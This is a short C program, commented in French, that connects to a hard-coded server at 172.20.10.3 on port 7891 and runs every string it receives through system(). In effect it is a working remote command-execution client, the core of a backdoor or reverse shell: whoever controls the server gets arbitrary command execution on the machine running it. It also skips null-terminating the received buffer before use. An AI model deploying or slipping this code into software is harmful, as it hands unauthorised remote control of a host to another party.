#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h> // Include for read function
#include <stdlib.h>

int executeCommand(const char *command) {
    int ret = system(command);
    
    if (ret == -1) {
        perror("Erreur lors de l'exécution de la commande");
        return 1; // Retourne 1 en cas d'erreur
    }

    return 0; // Retourne 0 si la commande est exécutée avec succès
}

int main(){
    int clientSocket;
    char buffer[1024];
    struct sockaddr_in serverAddr;
    socklen_t addr_size;

    printf("Initialisation du client...\\n");

    // Créer le socket
    clientSocket = socket(PF_INET, SOCK_STREAM, 0);
    printf("Socket client créé.\\n");

    // Configurer les paramètres de l'adresse du serveur
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(7891);
    serverAddr.sin_addr.s_addr = inet_addr("172.20.10.3");
    memset(serverAddr.sin_zero, '\0', sizeof serverAddr.sin_zero);  

    // Connecter le socket au serveur
    printf("Tentative de connexion au serveur...\\n");
    addr_size = sizeof serverAddr;
    if (connect(clientSocket, (struct sockaddr *) &serverAddr, addr_size) < 0) {
        printf("Échec de la connexion au serveur.\\n");
        return -1;
    }
    printf("Connecté au serveur.\\n");

    // Boucle pour recevoir des messages en continu du serveur
    while(1){
        printf("En attente de reception de mesage");
        int bytesRead = recv(clientSocket, buffer, 1024, 0);
        if (bytesRead <= 0){
            break; // Sortir de la boucle si la connexion est perdue
        }
        printf("Commande execute par serveur: %s\\n", buffer);
        executeCommand(buffer);
    }

    return 0;
}
